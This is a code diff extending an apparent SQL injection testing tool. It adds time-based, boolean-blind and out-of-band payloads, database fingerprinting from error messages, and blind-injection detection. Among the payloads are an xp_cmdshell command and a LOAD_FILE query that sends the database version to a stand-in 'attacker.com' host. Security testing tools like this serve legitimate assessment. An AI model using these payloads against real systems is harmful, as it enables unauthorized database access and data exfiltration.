@@ -52,6 +52,20 @@ PAYLOAD_PRESETS: Dict[str, Sequence[str]] = {
     "time": (
         "' OR SLEEP(5)--",
         "'; WAITFOR DELAY '0:0:5'--",
+        "' OR pg_sleep(5)--",
+        "' OR BENCHMARK(5000000,MD5(1))--",
+    ),
+    "boolean_blind": (
+        "' AND 1=1--",
+        "' AND 1=2--",
+        "' AND 'a'='a",
+        "' AND 'a'='b",
+        "') AND ('1'='1",
+        "') AND ('1'='2",
+    ),
+    "out_of_band": (
+        "'; EXEC xp_cmdshell('nslookup test.example.com')--",
+        "'; SELECT LOAD_FILE(CONCAT('\\\\', (SELECT @@version), '.attacker.com\\test'))--",
     ),
 }
 
@@ -90,6 +104,8 @@ class SQLInjectionTester:
         follow_redirects: str = "true",
         timeout: str = "8",
         include_sqlmap_hint: str = "true",
+        detect_database: str = "true",
+        boolean_blind: str = "false",
     ) -> ToolResult:
         target = target.strip()
         if not target:
@@ -149,9 +165,29 @@ class SQLInjectionTester:
             f"Method: {method}",
             f"Parameter: {chosen_param}",
             "",
-            "Payload results:",
         ]
 
+        # Database fingerprinting
+        detected_db: Optional[str] = None
+        if self._truthy(detect_database) and results:
+            all_errors = []
+            for probe in results:
+                all_errors.extend(probe.errors)
+            detected_db = self._fingerprint_database(all_errors, baseline, results)
+            if detected_db:
+                body_lines.append(f"Detected database: {detected_db}")
+                body_lines.append("")
+
+        # Boolean-based blind detection
+        boolean_results: List[str] = []
+        if self._truthy(boolean_blind):
+            boolean_results = self._detect_boolean_blind(baseline, results)
+            if boolean_results:
+                body_lines.append("Boolean-based Blind SQLi Detection:")
+                body_lines.extend(boolean_results)
+                body_lines.append("")
+
+        body_lines.append("Payload results:")
         for probe in results:
             status = probe.status if probe.status else 0
             marker = []
@@ -277,6 +313,93 @@ class SQLInjectionTester:
         if body_template.strip():
             parts += ["--data", body_template]
         return " ".join(parts)
+
+    def _fingerprint_database(
+        self, errors: List[str], baseline: _ProbeResult, results: List[_ProbeResult]
+    ) -> Optional[str]:
+        """Detect database type from error messages and behavior."""
+        error_text = " ".join(errors).lower()
+        
+        # MySQL indicators
+        mysql_patterns = ["mysql", "mysqli_", "mysql_fetch", "you have an error in your sql syntax"]
+        if any(pattern in error_text for pattern in mysql_patterns):
+            return "MySQL"
+        
+        # PostgreSQL indicators
+        postgres_patterns = ["postgresql", "pg_", "psql:", "relation", "column"]
+        if any(pattern in error_text for pattern in postgres_patterns):
+            return "PostgreSQL"
+        
+        # MSSQL indicators
+        mssql_patterns = ["microsoft sql", "sql server", "odbc sql server", "oledb", "odbc driver"]
+        if any(pattern in error_text for pattern in mssql_patterns):
+            return "Microsoft SQL Server"
+        
+        # Oracle indicators
+        oracle_patterns = ["ora-", "oracle", "oracle error", "oci"]
+        if any(pattern in error_text for pattern in oracle_patterns):
+            return "Oracle"
+        
+        # SQLite indicators
+        sqlite_patterns = ["sqlite", "sqlite3", "sqlite error"]
+        if any(pattern in error_text for pattern in sqlite_patterns):
+            return "SQLite"
+        
+        # Time-based detection (different sleep functions)
+        for probe in results:
+            if "sleep" in probe.payload.lower() or "waitfor" in probe.payload.lower():
+                if baseline.duration and probe.duration - baseline.duration >= 3.5:
+                    # Could be MySQL, PostgreSQL, or MSSQL
+                    if "pg_sleep" in probe.payload.lower():
+                        return "PostgreSQL (time-based)"
+                    elif "waitfor" in probe.payload.lower():
+                        return "Microsoft SQL Server (time-based)"
+                    elif "sleep" in probe.payload.lower():
+                        return "MySQL (time-based)"
+        
+        return None
+
+    def _detect_boolean_blind(
+        self, baseline: _ProbeResult, results: List[_ProbeResult]
+    ) -> List[str]:
+        """Detect boolean-based blind SQL injection."""
+        findings: List[str] = []
+        
+        # Look for true/false condition patterns
+        true_payloads = [r for r in results if "1=1" in r.payload or "'a'='a" in r.payload]
+        false_payloads = [r for r in results if "1=2" in r.payload or "'a'='b" in r.payload]
+        
+        if true_payloads and false_payloads:
+            baseline_size = baseline.response_size
+            baseline_status = baseline.status
+            
+            for true_probe in true_payloads:
+                for false_probe in false_payloads:
+                    # Check if true condition gives different response than false condition
+                    if (
+                        abs(true_probe.response_size - false_probe.response_size) > 100
+                        or true_probe.status != false_probe.status
+                    ):
+                        findings.append(
+                            f"⚠ Possible boolean-based blind SQLi detected: "
+                            f"True condition ({true_probe.payload!r}) vs False condition ({false_probe.payload!r}) "
+                            f"produce different responses"
+                        )
+                        break
+                if findings:
+                    break
+        
+        if not findings:
+            findings.append("No boolean-based blind SQLi patterns detected.")
+        
+        return findings
+
+    def _truthy(self, value: str | bool | None) -> bool:
+        if isinstance(value, bool):
+            return value
+        if value is None:
+            return False
+        return str(value).strip().lower() in {"1", "true", "yes", "on"}
 
     def _parse_headers(self, header_blob: str) -> Dict[str, str]:
         headers: Dict[str, str] = {}
